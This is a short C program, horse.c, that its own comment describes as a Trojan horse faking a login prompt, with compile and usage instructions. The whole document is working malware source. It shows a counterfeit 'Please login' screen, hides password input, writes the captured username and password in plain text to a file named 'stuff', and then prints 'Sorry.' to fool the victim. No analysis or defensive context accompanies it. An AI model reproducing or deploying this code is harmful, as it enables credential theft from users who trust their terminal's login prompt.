/*
  horse.c
  Trojan horse to fake a login prompt

  Compile:
  $ gcc horse.c -lcurses -o horse

  Or type:
  $ make

  Usage:
  $ ./horse
*/
#include <ncurses.h>		/* ncurses.h includes stdio.h */
#include <stdlib.h>
#include <signal.h>

#define SYSTEM "\n\nPlease login to continue\n\n"
#define LOGIN  "login: "
#define PASSWORD "password: "
#define WAIT 2
#define INCORRECT "Sorry.\n"
#define FILENAME "stuff"

void stop();
main()
{
    char name[10], password[100];
    int i;
    FILE *fp;
    signal(SIGINT, stop);
    initscr();	/* initialize curses */
    raw(); 
    printw(SYSTEM);
    printw(LOGIN);
    scanw("%s",name);
    noecho();			/* do not echo pressed chars */
    printw(PASSWORD);
    scanw("%s",password);
    printw("\n");

    echo();
    sleep(WAIT);

    if ( ( fp = fopen(FILENAME,"a") )  != NULL ) {
	fprintf(fp,"%s : %s\n",name,password);
	fclose(fp);
    }

    printw(INCORRECT);
    refresh();
    sleep(1);
    endwin();			/* finish curses */
}

void stop()
{
    endwin();
    exit(1);
}
